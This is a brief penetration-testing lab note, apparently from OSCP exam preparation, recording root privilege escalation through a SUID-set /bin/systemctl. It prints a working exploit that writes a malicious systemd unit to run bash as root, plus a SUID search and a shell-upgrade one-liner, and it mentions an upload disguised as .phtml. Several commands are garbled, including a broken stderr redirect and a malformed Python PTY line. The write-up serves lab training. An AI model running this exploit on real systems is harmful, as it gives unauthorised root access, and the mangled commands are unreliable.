**Service Exploited:  
Vulnerability Type:
Exploit POC:**
**Description**: 

**++Discovery of Vulnerability++**
search for all SUID bits set:
SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.

find . -perm /4000 2./dev/null
/bin/systemctl stood out

<https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49>
*renamed to phtml to upload


Upgrade to PTY shell:
python -c ‘import.pty: pty.spawn("/bin/bash")’

**++Exploit Code Used++**
priv=$(mktemp).service

echo '[Service]
>ExecStart=/bin/bash -c “cat /root/root.txt > /opt/flag”
>[Install]
>WantedBy=multi-user.target' > $priv

#run the unit file using systemctl
/bin/systemctl link $priv
/bin/systemctl enable --now $priv

excuted as root
cat /opt/flag




**++Proof\Local.txt File++**

   - [ ] Screenshot with ifconfig\ipconfig
   - [ ] Submit too OSCP Exam Panel

